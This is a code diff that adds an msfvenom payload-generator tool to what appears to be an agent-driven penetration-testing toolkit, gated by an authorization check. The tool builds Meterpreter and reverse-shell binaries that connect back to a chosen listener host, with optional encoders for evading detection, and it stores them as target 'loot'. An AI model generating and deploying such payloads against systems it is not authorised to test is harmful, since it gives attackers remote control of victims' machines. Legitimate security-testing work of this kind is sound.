@@ -234,3 +234,148 @@ async def searchsploit_search(args: dict) -> dict:
 
 
 TOOLS.append(searchsploit_search)
+
+
+# ── msfvenom (payload generator) ────────────────────────────────────
+
+import hashlib
+import re as _re
+
+from ..kb import ArtifactFact
+
+
+_PAYLOAD_NAME_RE = _re.compile(r"[^a-zA-Z0-9_-]+")
+
+
+def _mangle_payload_name(payload: str) -> str:
+    """Turn 'windows/x64/meterpreter/reverse_tcp' into a filesystem-safe stem."""
+    return _PAYLOAD_NAME_RE.sub("_", payload).strip("_")
+
+
+def _payload_loot_dir(target: str) -> Path:
+    """Per-target loot/payloads/ directory."""
+    return _targets_root() / target / "loot" / "payloads"
+
+
+def _run_msfvenom(cmd: list[str], timeout: int = 120) -> dict:
+    """Invoke msfvenom. Pulled out for test mocking."""
+    try:
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        return {
+            "stdout": proc.stdout,
+            "stderr": proc.stderr,
+            "returncode": proc.returncode,
+        }
+    except subprocess.TimeoutExpired:
+        return {"stdout": "", "stderr": f"msfvenom timed out after {timeout}s",
+                "returncode": -1}
+    except FileNotFoundError:
+        return {"stdout": "", "stderr": "msfvenom not found in PATH "
+                "(install via `metasploit-framework` package)", "returncode": 127}
+
+
+@tool(
+    "msfvenom_generate",
+    "Generate a Metasploit payload via msfvenom. Writes the binary to "
+    "targets/<target>/loot/payloads/<name>-<sha8>.<ext> and records an "
+    "ArtifactFact in the KB. Common payloads: windows/x64/meterpreter/reverse_tcp, "
+    "linux/x64/shell_reverse_tcp.",
+    {
+        "type": "object",
+        "properties": {
+            "payload": {"type": "string",
+                        "description": "MSF payload name (e.g. windows/x64/meterpreter/reverse_tcp)"},
+            "lhost": {"type": "string", "description": "Listener host"},
+            "lport": {"type": "integer", "default": 4444,
+                      "description": "Listener port"},
+            "format": {"type": "string", "default": "exe",
+                       "description": "Output format (exe, elf, raw, python, ...)"},
+            "target": {"type": "string",
+                       "description": "Target identifier — determines loot dir and KB"},
+            "encoder": {"type": "string", "default": "",
+                        "description": "Optional encoder (e.g. x64/shikata_ga_nai)"},
+            "iterations": {"type": "integer", "default": 1,
+                           "description": "Encoder iterations (only if encoder set)"},
+            "bad_chars": {"type": "string", "default": "",
+                          "description": "Bytes to avoid (e.g. '\\x00\\x0a\\x0d')"},
+            "options": {"type": "object", "default": {},
+                        "description": "Extra payload options as KEY=VALUE map"},
+        },
+        "required": ["payload", "lhost", "target"],
+    },
+)
+async def msfvenom_generate(args: dict) -> dict:
+    try:
+        require_pentest_auth()
+    except AuthorizationError as e:
+        return format_error(str(e))
+
+    payload = args["payload"]
+    lhost = args["lhost"]
+    lport = int(args.get("lport", 4444))
+    fmt = args.get("format", "exe") or "exe"
+    target = args["target"]
+    encoder = (args.get("encoder") or "").strip()
+    iterations = int(args.get("iterations", 1) or 1)
+    bad_chars = args.get("bad_chars") or ""
+    options = args.get("options") or {}
+
+    loot_dir = _payload_loot_dir(target)
+    loot_dir.mkdir(parents=True, exist_ok=True)
+    stem = _mangle_payload_name(payload)
+    # We don't know the sha8 until after msfvenom runs; write to a temp name
+    # then rename. Use a fixed temp-stem with the process PID so concurrent
+    # invocations don't collide.
+    tmp_path = loot_dir / f"{stem}-tmp-{os.getpid()}.{fmt}"
+
+    cmd: list[str] = ["msfvenom", "-p", payload,
+                      f"LHOST={lhost}", f"LPORT={lport}",
+                      "-f", fmt, "-o", str(tmp_path)]
+    if encoder:
+        cmd += ["-e", encoder, "-i", str(iterations)]
+    if bad_chars:
+        cmd += ["-b", bad_chars]
+    for k, v in options.items():
+        cmd.append(f"{k}={v}")
+
+    proc = _run_msfvenom(cmd)
+    if proc["returncode"] != 0 or not tmp_path.is_file():
+        # Clean up the temp file if it was created
+        if tmp_path.is_file():
+            try:
+                tmp_path.unlink()
+            except OSError:
+                pass
+        return format_error(
+            f"msfvenom failed (rc={proc['returncode']}): "
+            f"{proc['stderr'][:1000] or proc['stdout'][:1000]}"
+        )
+
+    data = tmp_path.read_bytes()
+    sha = hashlib.sha256(data).hexdigest()
+    sha8 = sha[:8]
+    final_path = loot_dir / f"{stem}-{sha8}.{fmt}"
+    tmp_path.rename(final_path)
+
+    try:
+        kb = for_target(target)
+        kb.record_artifact(ArtifactFact(
+            kind="payload",
+            path=str(final_path),
+            sha256=sha,
+            source_tool="msfvenom",
+        ))
+    except Exception:
+        pass  # best-effort
+
+    summary = (
+        f"msfvenom payload generated:\n"
+        f"  path:    {final_path}\n"
+        f"  payload: {payload}\n"
+        f"  size:    {len(data)} bytes\n"
+        f"  sha256:  {sha}"
+    )
+    return format_tool_result(summary)
+
+
+TOOLS.append(msfvenom_generate)
